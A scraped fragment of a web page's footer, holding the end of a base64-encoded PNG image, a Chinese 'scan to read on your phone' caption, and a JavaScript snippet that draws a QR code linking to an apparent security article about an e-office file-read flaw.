5TuU51vnmyqdbTm4qXeuQnsy/zQfXMO6tk9mXGvhXue3JtX6P96smm5GLn1IPLhdh04d99AncLyZb25XGy6X2Z0V9xezqnLna/ebFzzdPfWXljsiln6Mvj7UtfTW5+hebbt/8M7xZyFrq0v/cElj+pu9U+Sm+9/e4z3zl5+82/krNX7LM4S+ycXP92myv1nqe+wum+Hf5PQ8k65wyvT8jtvX5tP6n3tlbHNNe+et6A1MrvnLzzcn1xpesHzeQcKbmYTEouRks1j5bKrFT7zZPdV/vyM7w+IWdP5YXa9j0km/9KeWbfhOat92x9dfvFla4vmguqid5Dnsy+VvqqT120v9F7PNLN7fH6hPRTezHfFuLWH+HqvG5ZX+48dfGRb5850X7RXFBthcmclXm9vlfr+qL9onm52Lp8j9tCbLrwtU/gbiFuvXF1THP6crcu11eX6690cyvf/j3ao7bi6s5e5Vu3r9Fc46Pc3r9byN68rv/+E/jjC1m9bX5pvj3mRH25qG6fvH31YHtyMZlUz4yWMtcYL9W6PN6+Vrq66DmCf3wh+wNd119/Av/bQtz+CvuoeTv21b7ceWbV9/iZl9yzvjmx762emWel331m9eXB/20hGX7V15/A3ULcZuNqtDl9t75Cc8+i80Xn2q++x/bk4j6ba2fm+rMy13PkX0Xvte+7W8jevK7//hPYFuL2H+GzR3T7jc7vOc/m7DMv/w56FmfJV9j3MKfuHFG9c3LRXHBbSMhVr38C10Jev4PDCf4FAAD//5XIk5AAAAAGSURBVAMAcSNhv3jSoNUAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/eoffice-iWebOffice-OfficeServer-fileread.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 